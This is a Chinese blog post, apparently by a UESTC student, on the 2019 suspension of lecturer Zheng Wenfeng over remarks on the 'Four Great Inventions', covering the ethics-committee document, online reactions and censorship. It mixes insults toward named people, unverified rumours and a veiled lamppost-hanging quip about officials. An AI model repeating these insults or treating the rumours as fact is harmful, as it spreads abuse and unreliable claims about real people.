<p>之前核心通识课程上过自动化学院谢永乐老师的课，闭着眼谢永乐老师，当时那个课只有一个学分，但是谢老师很“事多”。每节课必点名，而且几乎每个人都要认一遍（其实每个人都要认一遍，谢老师基本每个人都很关心，这个课是小班，不到二十个人，想逃课或者水过去是不可能的），还要经常把每个请上台讲一下自己的观点。而且中途还要交作业，几千字（具体多少字忘了，反正不少于五千）的小论文，期中期末各一次，必须手写。谢老师讲课时非常有热情，批改也及其认真。这就造成了这门课强度几乎高于很多两三个学分的必修课。 这似乎也导致了这门课的评价两极分化，一些人唯恐避之不及，一些人觉得这是个很好的老师。 谢老师是很欢迎我们讨论的，自己说“不搞一言堂，我们也不是文革，只有一个声音”，把我们拉上去讨论也很希望出现新的见解。谢老师上课很认真，备课也很负责，看得出来谢老师是真的喜欢传统文化，真的很喜欢古诗词。（不过虽然他确实读了不少古文古诗，但是章口就莱时还是念错不少字，被刚高考完半年的我敏锐地挑了出来） 说来惭愧，谢老师表扬过我，本人至今还和谢老师是微信好友。现在我基本修完大学所有的学分了，谢老师文学水平且不提，感觉这么较真的课程已经超过绝大部分必修了。</p>
<p>再次表示本人与郑老师没有交集，但是看这几个月知乎微博河畔上我电学生的评价，绝大部分说好，一些人说不好。我觉得这个郑老师应该属于这种很“事多”的老师，不然这种课水水就过去了，大家都轻松愉快，何必呢。（不认识郑老师，随便猜测）。当然还有种可能就是老师拿着鸡毛当令箭，私货很多，类似侯伦广，像这个回答说的那样： <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MjA0OTI5OC9hbnN3ZXIvNzk5NTc3NTAx">如何看待称「四大发明在世界上都不领先」高校老师因“师德失范”遭停课两年？ - 挤按睛明穴的回答 - 知乎<i class="fa fa-external-link-alt"></i></span> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190827101306.png" alt="知乎回答" /> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MjA0OTI5OC9hbnN3ZXIvNzk4NDU2MDYw">如何看待称「四大发明在世界上都不领先」高校老师因「师德失范」遭停课两年？ - 朝经暮史的回答 - 知乎<i class="fa fa-external-link-alt"></i></span>里面一些早期负面评价截图 一个河畔回答，我看到好多人都说这门课全程录像，那不妨请学校把录像放出来我们看看 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190827100038.png" alt="一个河畔回答" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FyY2hhZW9yYXB0b3IvaW1hZ2VfcmVzb3VyY2VzL0ltYWdlb2ZCbG9nLyVFNSU4QSU4OCVFNiU5RiVCNC5qcGc=">河畔小道消息<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="该课程问题驱动的创新创业">该课程（问题驱动的创新创业）</h3>
<p>俺们本科生也有这个课，算在核心通识的 研究生的不太了解，道听途说的情况： 0.5学分，开在研一下学期，选修，很多人公认的水课，据说很多人期末交个1000字的小论文就水过去了</p>
<p>但是郑老师要求15000字，貌似比较“事多” 至于怎么看待所谓的水课，这就是另一个问题了，这里不表 (更新，期末应该是8000字，10%查重，15000字是总计几次小论文合计字数)</p>
<p>更新，这是个人文交流月的课程，貌似上课时间只有一周 这样看来0.5学分、选修课，确实这么重的任务有些过分了 至于为什么有这种尴尬课程，这就要从李校长的“人文气息”说起（请各路明星和于丹、六老师这种货色），从李中堂"大众创业万众创新"说起（指坑韭菜的钱）</p>
<h3 id="电子科技大学师德建设委员会文件">电子科技大学师德建设委员会文件</h3>
<p>这个今天（2019.8.21）在微博等网站火起来的文件高斯模糊、来源不明，我暂时无法判定真假。</p>
<p>但是很多人人说那个师德建设委员会不存在，妹听说过，学校官网上查不到这么个机构；我只想说，善用搜索引擎啊同志们，这个是真实存在的，我就随手这么一谷歌，就找到了你电官网上的相关新闻，而且还看到了那个盖章的党委教师工作部，这么看红头文件可不太像是假的啊。 就是下面这个网址，谷歌搜索结果的第二名，赫然在列 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/partment3.PNG" alt="谷歌结果" /> <span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVlc3RjLmVkdS5jbi8/bj1VZXN0Y05ld3MuRnJvbnQuRG9jdW1lbnQuQXJ0aWNsZVBhZ2UmYW1wO0lkPTY3MTE4">https://news.uestc.edu.cn/?n=UestcNews.Front.Document.ArticlePage&amp;Id=67118<i class="fa fa-external-link-alt"></i></span> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/partment2.PNG" alt="电子科技大学师德建设委员会" /> 点进去第一条： &gt;一、加强组织保障，完善工作机制 出台《电子科技大学师德师风建设实施办法》，构建学校党委统一领导、二级单位组织实施、教师主动参与的师德建设工作体系。组织成立学校师德建设工作委员会，负责师德建设工作总体规划；成立党委教师工作部，具体负责制度建设、组织落实、督导检查等工作。制定二级单位师德建设工作任务清单，明确二级单位党委师德建设职能职责，将师德师风建设纳入二级单位年度目标考核。强化教师自我教育，坚持将师德建设作为加强教师自身建设的重要内容，规定教师每年必须参加不少于2个学时的师德教育，并将学习情况纳入教师年度考核。</p>
<p>而我们打开另一条新闻<span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVlc3RjLmVkdS5jbi8/bj1VZXN0Y05ld3MuRnJvbnQuRG9jdW1lbnQuQXJ0aWNsZVBhZ2UmYW1wO0lkPTcyMzgy">学校举行第四期思政及师德师风培训班结业典礼暨师德师风建设专题会议<i class="fa fa-external-link-alt"></i></span>，还可以看到 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/partment4.PNG" alt="师德建设委员会" /> &gt;师德师风巡视员张开华、汤炎灿、徐全智、赵璧全、马立香、姜书艳，师德建设委员会成员单位负责人、312名培训学员，全体“青字号”人才，学院党委书记、学院分管教学、研究生、学生工作的副院长、副书记，全体教职工党支部书记、组织员，辅导员，学院教务科、研究生科工作人员等参加会议。教师发展中心主任罗小蓉主持会议。 &gt; 师德建设委员会成员赫然在列</p>
<p>这个知乎回答说的很好，文件不像是假的： &gt;作者：之乎者也 链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTg3NjU4NC9hbnN3ZXIvNzk3NjYyMTI1">https://www.zhihu.com/question/341876584/answer/797662125<i class="fa fa-external-link-alt"></i></span> 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 一大波自认为专业的人从公文行文格式的角度分析这是份假文件，还说得头头是道。特别是 生之初尚无为 仁兄，竟然列出了行文错误之处达十条之多。就我在行政单位处理公文的经验来说，这百分百是份真文件，在校学生起个哄闹下事坑坑老师还行，要说造假水平还到不了这个层次。一、“XX单位文件”这是红头常用的版头，这种用法完全正确。二、关于文号，这是一份对内的文件，所以用“师德”二字完全正常，不是对外文件，不一定非要用“电科XX”开头。三、注意看年份外边是六角括号，这是公文发文年份的专用符号，不是专业人士都不知道这符号怎么输入，多半打成【】符号，这是很多假公文常犯的错误。四、关于文件序号，1号文，这个太正常不过了，师德方面本来事情就少，顶多开开会，哪用得着正式公文，所以七月份才发第一份文件很正常，发多了反倒是假文件了。另外常见公文编号错误就是把“1号”写成“第1号”，这份文件妥妥的避开这个坑。五、关于文件标题，“决定”是一个文种，关于XX的决定，就像关于XX的通知一样，一定是“的+文种”的格式，那些叫嚷“XX的处理决定”的可以洗洗睡了，还有说标题加个引号的，求您别不懂装懂误人子弟行不？六、落款师德建设委员会，盖教师工作部的章，还特别标明代章，就这严谨程度，是造假的娃娃们达不到的高度。师德委员会不是一个常设机构，没有专门的人员编制，没有印章很正常，而又要用它的名义出文件，那么就只好找个跟它工作相似的部门代章，这才是严谨的做法。要真造假，直接出个教师工作部的文件或者弄个师德委员会的章不是更好？知道代章的就如同前文所说知道六角符号的，这都是真正处理公文的专业人士。七、还有说字体错误的，拜托，标题二号小标宋，正文三号仿宋，这么正确的公文字体你还能找出错误？你没见low逼的假公文标题都用黑体么？知道在电脑上安装小标宋体字的都是半个专业人士。八、还有说这个处理决定应该由党委或者学校来出的，拜托，老郑他犯了哪条党纪国法了，就他那点破事，顶多也就一个言论不当，够不上大的处分，党委和学校那都是出警告、记过、降级、开除之类的处分决定。老郑这事儿吧，其实不严重，但是引起了大舆论，这就得处理了，既然事情不严重就不适合用党委或学校名义来处理，用师德委员会的名义刚刚好。基于以上，该问题所有关于文件真假的讨论就此终结。这份文件必定是真的，从公文格式讨论文件真假的同学，你们可以洗洗睡了。 &gt;</p>
<p>什么？为什么官网没有这个机构？对不起，我电行政的办事速度、我电网站的维护更新速度和土豆服务器我不想和你解释，我也不知道怎么解释,两天前就发生过下图这种事:</p>
<p><img width=350 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/%E9%97%A8%E6%88%B7.jpg"/></p>
<h3 id="如何看待知乎治校">如何看待知乎治校</h3>
<p>当然是支持啊，有人因为这个反对知乎治校，我就不明白，这事能怪到知乎治校头上啊？而且这此想搞大新闻的电卫兵可是活生生被骂上热搜的。知乎治校更有利于公正公开，也可以像这次一样让众人看清楚全过程，真有了事河畔狗管理真出了事第一时间删帖，邵振海张翼德宁宁都是河畔删帖空瓶查水表转战知乎才闹大的。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzY4MTEwODg0">知乎治校<i class="fa fa-external-link-alt"></i></span>我怎能不资瓷，<span class="exturl" data-url="aHR0cHM6Ly90Lm1lL29oY2R6eg==">电报治校<i class="fa fa-external-link-alt"></i></span>就更好辣 如何看待称「四大发明在世界上都不领先」高校老师因“师德失范”遭停课两年？ - 竹青的回答 - 知乎 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MjA0OTI5OC9hbnN3ZXIvODAxMzU3ODg1">https://www.zhihu.com/question/342049298/answer/801357885<i class="fa fa-external-link-alt"></i></span> &gt;<strong>“但凡学生有别的体面方法反抗，也不会采取这么复杂下作的方式，借助规则把事情做绝。”</strong>我就奇怪了，以往碰到这种问题，资乎主流的口径不应该是这样的么？而且我记得，通常资乎都是站在诸如学生这样的弱势群体一边的，大佬们都是无条件支持弱势者的反抗的。怎么？因为事关“文化自信”，这次都转而维护“师道尊严”了？学生的反抗呢？这次就被你们无视了？说到底这里批判学生的和给此类立场点赞的诸位，并不是真的想看到平等的师生关系，也不是真的支持弱者，只不过是屁股使然罢了。</p>
<p>这次微博上以奥老师为首的正能量学阀以及狗公知们张口闭口哭的那个惨啊，把老师描绘成了楚楚可怜的弱势群体，向我们展示了学阀的无耻嘴脸。国内硕导博导掌握生杀大权，欺压学生时没见某些狗跳出来这么激动。武汉爸爸大学那会微博上某些教授的嘴脸可不是这样啊，不仅不出来伸张正义，卖惨装死可在行了。到底还是屁股决定立场啊。 还有一些狗公知，监督政府时一口一个把权力关在笼子里，轮到自己了，满嘴自由；你们双标和上来就喷不是一天两天了，行为坦荡程度都不如境外轮子，和花公公周带鱼可真是势均力敌的对手。</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190827111902.png" alt="如此厚颜无耻之徒" /> 颇有在Metoo那会鄢烈山刘瑜等一众老贼的嘴脸：Metoo运动too到公知圈，大喊Metoo是文革大字报民粹 <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0Btb3JlbGVzcy/oo4XlpJblrr7nmoTliJjnkZwtYjk2MTJlNGMwMDdj">“何不食肉糜”的劉瑜——自由派公知的衰落<i class="fa fa-external-link-alt"></i></span>，<span class="exturl" data-url="aHR0cHM6Ly90aGVpbml0aXVtLmNvbS9hcnRpY2xlLzIwMTgwODA2LW5vdGVzLW1ldG9vLWxpdXl1Lw==">端传媒地址<i class="fa fa-external-link-alt"></i></span> 这里节选一段： &gt;刘瑜指责网上发声是文革式的大鸣大放贴大字报不走法律途径，且不说受害者网上发声要承受巨大压力，被人指责不检点不说，还要被人指责卖了还没达到目的所以出来指认。退一步讲，在中国走法律途径行得通吗，朱军一个小小case都被压制下来不许声张，她却以为中国真是法治国家，走法律途径可以得到公正的结果，类似于问“何不食肉糜”。 文革贴大字报跟此事有任何相似之处吗，按照邓式官方文革解读，贴大字报是冲击社会现有秩序，但是还有1978年发生的西单民主墙事件，那是公民自发的意见表达机会。 大鸣大放起始于1957年开始的帮党整风的运动，是“百家争鸣，百花齐放”的延伸。贴大字报在文革中比较盛行，也对各级大小官员有一定的约束作用。四大作为公民自由表达的基本权利被写进了1975年宪法。文革结束后也没有马上废止，还写进了1978年宪法。直到发生了西单民主墙，矛头直指最高领导人以后，于是到1980年被当局取消。人民有了自由表达的权利就会乱套，这是官方意识形态一贯的思路，网上表达就是贴大字报，从而导致社会乱套，这是一套非常荒谬的逻辑。刘瑜哥伦比亚政治学博士毕业，主攻方向就是文革，把大鸣大放大字报完全等同于暴民政治，显然不符合历史事实。 出身于省部级官员家庭的刘瑜可能一路顺风顺水没被人占过便宜，但是那也不应该站着说话不腰疼说穿着暴露活该被性侵。 公民个人表达就扣上一个民粹搞文革的帽子，煽动民粹带节奏的是官方公号，不是动不动就被封号禁言的个人帐号。可见刘瑜坚持的还是主流意识形态立场。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jaGluYWRpZ2l0YWx0aW1lcy5uZXQvY2hpbmVzZS8yMDE4LzA3L+iDoea2tW1hcnZpbu+8muWRiuWIq+WFrOefpeaXtuS7oy8=">胡涵Marvin：告别公知时代<i class="fa fa-external-link-alt"></i></span></p>
<p>什么时候能这样义，什么时候才有资格谈不要知乎治校，不要举报，不要贴大字报 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190827112537.png" alt="我也很好奇" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTg3NjU4NC9hbnN3ZXIvODAzNDY2NDEz">如何评价电子科技大学对于郑文锋老师做出的处理决定？ - 琅邪杨文理的回答 - 知乎<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="教育部or你电">教育部or你电</h3>
<h4 id="是不是上面的意思">是不是上面的意思</h4>
<p>据小道消息，教育部的意思，学校是想保这个老师的没保住。 是学校干的还是教育部的意思，我倾向于是教育部的意思。我电，啊，这个大家也都知道，学校行政出了事从来都是偏袒老师的，说沆瀣一气也不为过。这个嘛，对比俺们学校之前张翼德邵振海宁宁的处理力度和其他老师与学生的小纠纷。再看看陈宝宝部长有关师德的讲话，俺觉得就是教育部干的，迫真（再次暴论） 因为知乎闹大半夜上了个热搜第一就对老师做出这种处罚，不可能，这不你电，这不大气大气，更何况知乎问题下面全是骂电卫兵支持老师，要按照舆情也因该是处罚学生</p>
<h4 id="谁之过">谁之过</h4>
<p>一群人就乱喷吧，也不看看某委员会委员长是谁，也不看看章上那镰刀锤子，能把锅扣在校长头上，校长确实咳咳咳，他一个致公党员可管不了党委和师德委员会的事，但也不能啥锅都往校长头上扣， 是吧，网络喷子们？ <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pica.jpg" alt="这回不是云法官，这回是真律师" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pica2.jpg" alt="不评价" /> 无中生蛆，反正这次我看到的护校蛆连微博协会拉皮条事件中的十分之一都不到（那又是什么事件？无可奉告，微博自己搜吧，古战场遗迹应该还在）。恁比女拳还会隔空打拳。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pica3.jpg" alt="恁比女拳还会隔空打拳" /> 说起处分学生，甚至一堆大吼开除学生的，这时候就不言论自由、学术自由啦，这回就不处罚过重啦？还有一堆法律博主，恁依据哪条法律，哪条规定啊？这个时候不提什么合不合法辣，上图中律师连是不是那个女研究生干的都不还不确定呢，看到几张图捕风捉影，就开始骂辣，恁名字里还宪法呢。</p>
<h3 id="补充和后续">补充和后续</h3>
<p>郑老师的官网个人主页打不开了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/page1.PNG" alt="8.22日官网个人主页" /></p>
<blockquote>
<p>微博id@Kakyouin 6月15日，郑文锋问题被发到知乎。 6月24日《 电子科技大学教师师德失范行为处理办法（试行） 》通过，并于7月4日印发。 7月16日，电子科技大学根据7月4日印发的《办法》对郑文锋6月份的行为作出处理。 按这个溯及既往、加班上马的思路，世界上没什么解决不了的问题和解决不了的人。</p>
</blockquote>
<p>这样的话貌似涉及秋后算账，程序有问题</p>
<p>看来处罚应该七月那会就已经落实了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic6.jpg" alt="河畔小道消息" /></p>
<p>在8.22晚8至9点，万转千转的几篇微博评论区先后遭到和谐 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/byxf.jpg" alt="未经证实的消息" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic8.jpg" alt="疑似控评" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/tognhzhiwei.jpg" alt="补充" /></p>
<p>之前凤凰搜狐等几家媒体的评论区早早关闭 一天之前博主琉璃厂人质问是否是教育部指使的微博被删除 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/%E7%90%89%E7%92%83.jpg" alt="琉璃厂人" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/%E7%90%89%E7%92%832.jpg" alt="琉璃厂人" /></p>
<p>聊天记录中提到的书《中国的发明创造-古往今来话中国》：<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzk5MjA3NTAw">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？ - skywear的回答 - 知乎<i class="fa fa-external-link-alt"></i></span></p>
<p>聊天中提到的辩证法，我直接扔个链接吧<span class="exturl" data-url="aHR0cHM6Ly93d3cuZG91YmFuLmNvbS9ncm91cC90b3BpYy84NTM0NzE2Lw==">https://www.douban.com/group/topic/8534716/<i class="fa fa-external-link-alt"></i></span></p>
<p>更新，河畔上知乎微博上好多将郑老师名字写成郑文峰的，包括上面截图里的童之伟老师博文，应该是“郑文锋”</p>
<p>更新，侠客岛，央视和光明日报的微信公众号评论了这一事件</p>
<p>更新，发现许多地方有一些三无小号跑出来疑似洗地，包括但不限于知乎微博河畔，请你们上大号 怂到用三无小号，不如自挂贫血楼 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTg3NjU4NC9hbnN3ZXIvNzk3MzU5MjI0">https://www.zhihu.com/question/341876584/answer/797359224<i class="fa fa-external-link-alt"></i></span> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/washfloor2.PNG" alt="知乎上的" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/washfloor.PNG" alt="河畔上的" /></p>
<p>更新，河畔同学发帖称征集当事人接受采访 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/fazhiribao.png" alt="法制日报" /></p>
<p>更新，博主黄少卿在微博扬言抵制某电，转发过五千，被删除。暂时不知道自己隐藏的还是渣浪干的，他的六月之后的微博内容一下子全没了。河畔有人称该博主控评并删除其评论。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/hsq.jpg" /> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/hsq2-390x357.jpg" /> 某电表白墙开始怼黄某人，目前黄某人再次发了一条微博。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/hjs.jpg" /> 恁这发个声明还要想几天，恁是树獭吗？开口就拒绝一切有关合作，郑老师也是电子科大的，他还有些商业创新项目，找你合作你要不要抵制？ 被怼了又重申“我尊重电子科大的每一位老师和每一位同学”，那几个你口中的红卫兵你尊不尊重？还重申，说的你好像之前尊重过一样。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/dddsx.jpg" alt="我佛辣" /> 跟个铁憨憨一样，真是，看看武汉爸爸大学那会当时一群人怎么抵制的：宣布从18年开始，如果武汉理工不道歉、不悔改、王攀不处理，高考报考武汉理工入学的学生不再录用。没有搞得已经在武理的学生为难，试图通过打击武理分数线来在不伤及无辜的情况下给校方施压。 武理当时冒着查水表危险广场写字的学生、放白花的学生，大家要是照宁这种抵制法抵制武理，怕是都要遭重，学生何辜？ 当初那个知乎问题可是被骂上热搜的，当时我目测成电学生及校友骂题主的超过95成，就是现在，河畔等地骂那几个研究生支持老师的怕是也超过9成。至于成电老师，你觉得会有老师喜欢举报？你上来就抵制，恁这做法比抵制日货还牛逼，简直战狼在世，就这恁还在微博当公知骂五毛喷抵制日货的愤青呢。反正恁逼逼两句自己也没损失，微博一片叫好，几千转发，一天涨粉几千，死道友不死贫道。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/dddsx.jpg" alt="我佛辣" /></p>
<p>更新，河畔有人发帖悬赏，目前赏金已经上千 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/capture.PNG" alt="悬赏帖子" /> 更新, 河畔上泥巴同学的消息 <img width=400 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190906132928.png" alt="picture"/> <img width=400 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190906132859.png" alt="picture"/></p>
<p>更新，我大概知道是什么事了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic10.jpg" alt="隐情" /> 那一年，20岁，事个学生 <img src="https://i.imgur.com/oA0Zc27.jpg?1" alt="小道消息" /> 那这样的话就更新到这里了，最后祝你，身体健康，再见。</p>
<h3 id="qa">Q&amp;A</h3>
<h4 id="大举报时代要来了">大举报时代要来了?</h4>
<p>早就来了,祝衮衮诸公，头颅安好，不上路灯</p>
<h4 id="文革红小兵要来了">文革红小兵要来了？</h4>
<p>兔区八组晋江粉红部分狗粉丝，早就来了，当然还有看上去特别正义的Metoo，是<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI5MTUyMTM5MS9hbnN3ZXIvNDc3NDEwMTI0">举报污蔑重要推手<i class="fa fa-external-link-alt"></i></span>，不过，我觉得你们该担心的根本不是红小兵 <img width=400 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/kaiser.jpg" alt="影帝离任讲话0.5倍速限定"/></p>
<h4 id="你怎么看">你怎么看</h4>
<p>我用手机看，当然写这篇博文时我正电脑前网上冲浪。</p>
<h4 id="如何看待核心通识成电讲坛之类的课程活动">如何看待核心通识、成电讲坛之类的课程活动</h4>
<p>画虎不成反类犬，我个人认为这和学院重组乱象一样，李言荣负有责任。 还有这几年的政策调整电赛折戟、robomaster实力不在，一个个连硬课都不敢选、怕影响成绩嫌性价比低不愿投入竞赛，已经影响了理工科学校的根基。 每次看到<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI4NjE2NzM4Mi9hbnN3ZXIvNDQ5Mjc3NDU3">蒋学长的回答<i class="fa fa-external-link-alt"></i></span>，就很唏嘘。 还有你电那个<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyNjU2MjExMy9hbnN3ZXIvNzE0MDMzNzk4">感人的实验报告<i class="fa fa-external-link-alt"></i></span>,大物实验我都不知道每次手抄好几页图个啥。 我不知道这样下去你电还是工程师的摇篮吗？<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQ0NzY5OTcyL2Fuc3dlci8xMjk3NDYxMjM=">电子科大UESTC的教育存在什么问题？ - John.L的回答<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="如何评价创新课程">如何评价创新课程</h4>
<p>大众创业、万众创新之类的口号现在也和互联网+小黄车一样凉透了，一地鸡毛。我之前上课，听一位老教授说他当年在老交大上大学那会，大跃进就跟现在一样啊，发动学生搞发明，搞了很多稀奇古怪的玩意。跑题了，这里不提当年那些事了，回到现在，这种水也不是不水也不是的鸡肋课程，我觉得在全校范围来看弊大于利。</p>
<h4 id="如何评价陈宝生">如何评价陈宝生</h4>
<p>党棍，要向全国人民谢罪的，包括但不限于留学生超国民待遇，中小学减负， 2049年，教育部领导的中国教育即将正式将稳稳地立于世界教育中心（指开花</p>
<h4 id="如何看待各校成立师德委员会">如何看待各校成立师德委员会</h4>
<p>陈宝生的又一丰功伟绩，跟寻衅滋事一样变成口袋罪，还是武汉爸爸大学等一系列事件发生之后表的态，然而，大家都懂的...(说起来我当时在微博怼武汉爸爸大学还把平均转评过10的大号给炸了...) 引用一下今天童之伟博主的说法 &gt;电子科技大学师德建设委员会发布处罚郑文峰高工的这份文件缺乏正当根据，实际上是严重侵犯郑老师合法权利和自由的行为，应当尽快撤回。任何组织无权随意制定道德、执行道德、做道德裁判，法外剥夺公民受宪法保护的基本的权利和自由。郑老师作为一个科技工作者，有权就科技史上的问题发表不同于其他人的看法</p>
<h4 id="如何评价四大发明">如何评价四大发明</h4>
<p>“四大”是用来凑数的，为何不是三大，不是五大？欧洲古滕堡印刷术跟中国活字印刷没多大关系，甚至东亚古代也是雕版印刷为主。至于火药，俺觉得欧洲对于火药威力的改进和枪炮的改进贡献远大于东亚。 反正中医不太行，传武不太行，<span class="exturl" data-url="aHR0cHM6Ly94dy5xcS5jb20vaXBob25lL20vbGVnYWN5aW50b3VjaC80N2E3ZjJjMDMzODAxYTgxODUyNDNlNmNhOGRmNWZhZS5odG1s">四大名著<i class="fa fa-external-link-alt"></i></span>也是,课本里的地动仪和司南就更扯了</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudGhlcGFwZXIuY24vbmV3c0RldGFpbF9mb3J3YXJkXzEzNTc0NDQ=">访谈︱江晓原：中国“四大发明”的争议从何而来<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="为何你电装死不出来回应">为何你电装死不出来回应</h4>
<p>这个，学校行政部门及领导可能还在放假哎，你看主楼好多办公室都没开门（手动滑稽） 难道学校不着急吗？这个可能还真不急，毕竟见得多了。 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190826104258.png" alt="tgchannel" /> 另外指望师德委员会怎样怎样恐怕希望不大，你看委员长是谁，挡尾苏吉wyf哦（不用查了，约等于泥电一把手）</p>
<h3 id="详情参考">详情参考</h3>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NA==">知乎原问题<i class="fa fa-external-link-alt"></i></span> （已被隐藏） 其他相关问题 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTcyNjk5OS9hbnN3ZXJzL3VwZGF0ZWQ=">如何看待电子科技大学个别学生公然诱导舆论，构陷副教授郑文锋侮辱四大发明？<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzE3MzU4Mzg2">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTc0NDU1MC9hbnN3ZXIvNzk2Njc4Mjc3">如何看待知乎热榜“如何看待电子科技大学副教授郑文锋公然侮辱四大发明”？<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTg3NjU4NA==">如何评价（疑似）电子科技大学对于郑文锋老师做出的处理决定？<i class="fa fa-external-link-alt"></i></span>、 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MjA0OTI5OA==">如何看待称「四大发明在世界上都不领先」高校老师因「师德失范」遭停课两年？<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9sb2c=">原问题的编辑记录<i class="fa fa-external-link-alt"></i></span> 可以看到电卫兵试图搞个大新闻时的最初提问内容，河畔搞事早已删除，时间久远，没有备份。</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzE5NDE4NzIw">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？ - 红盾局长克里斯的回答 - 知乎<i class="fa fa-external-link-alt"></i></span> 一个暴躁师兄的回答，我对该研究生的态度基本同此。</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzE3ODEzMzU2">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？ - 知乎<i class="fa fa-external-link-alt"></i></span> 对于“公然侮辱”的评价，我的观点基本同此</li>
<li>成电新闻两则<br />
